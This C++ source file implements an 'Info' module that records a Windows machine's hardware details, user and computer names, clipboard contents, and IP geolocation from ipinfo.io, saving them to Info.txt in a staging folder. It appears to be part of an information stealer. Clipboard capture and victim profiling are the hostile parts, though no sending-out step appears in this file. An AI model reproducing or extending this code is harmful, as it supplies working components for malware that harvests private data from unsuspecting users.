//
// Created by .1qxz on 08.06.2024.
//

#include "Info.h"
#include <cstdlib>

void Info::execute(fs::path &root) {
    SYSTEM_INFO siSysInfo;
    GetSystemInfo(&siSysInfo);

    std::stringstream ss;

    Info::writeHardwareInfo(ss);
    ss << "\n";
    Info::writePCInfo(ss);
    ss << "\n";
    Info::writeIPInfo(ss);

    Utils::writeFile(root / "Info.txt", ss.str());
}

void Info::writeHardwareInfo(std::stringstream &ss) {
    ss << "Hardware:\n";
    ss << "  OS: " << OSUtil::getOsInfo() << "\n";
    ss << "  CPU: " << OSUtil::getCPUInfo() << "\n";
    ss << "  MEM: " << OSUtil::getMemoryInfo() << "\n";
}

void Info::writePCInfo(std::stringstream &ss) {
    char acUserName[100];
    DWORD nUserName = sizeof(acUserName);

    char acPcName[100];
    DWORD nPcName = sizeof(acUserName);

    GetUserName(acUserName, &nUserName);
    GetComputerName(acPcName, &nPcName);

    ss << "User:\n";
    ss << "  PC: " << acPcName << "\n";
    ss << "  NAME: " << acUserName << "\n";
    ss << "  CLIPBOARD: " << OSUtil::getClipboardText() << "\n";
}

void Info::writeIPInfo(std::stringstream &ss) {
    std::pair<std::string, int> request = HttpUtil::sendHttpRequest("https://ipinfo.io/json");
    if(request.second != 200)
        return;

    try
    {
        json resp = json::parse(request.first);

        ss << "IP: " << std::string(resp["ip"]) << "\n";
        ss << "  COUNTRY: " << std::string(resp["country"]) << "\n";
        ss << "  REGION: " << std::string(resp["region"]) << "\n";
        ss << "  CITY: " << std::string(resp["city"]) << "\n";
        ss << "\n";

        if(resp.contains("hostname"))
            ss << "  HOSTNAME: " << std::string(resp["hostname"]) << "\n";

        if(resp.contains("org"))
            ss << "  PROVIDER: " << std::string(resp["org"]) << "\n";

        ss << "\n";
        ss << "  TIMEZONE: " << std::string(resp["timezone"]) << "\n";
    }
    catch (const json::exception& ignored) {}
}
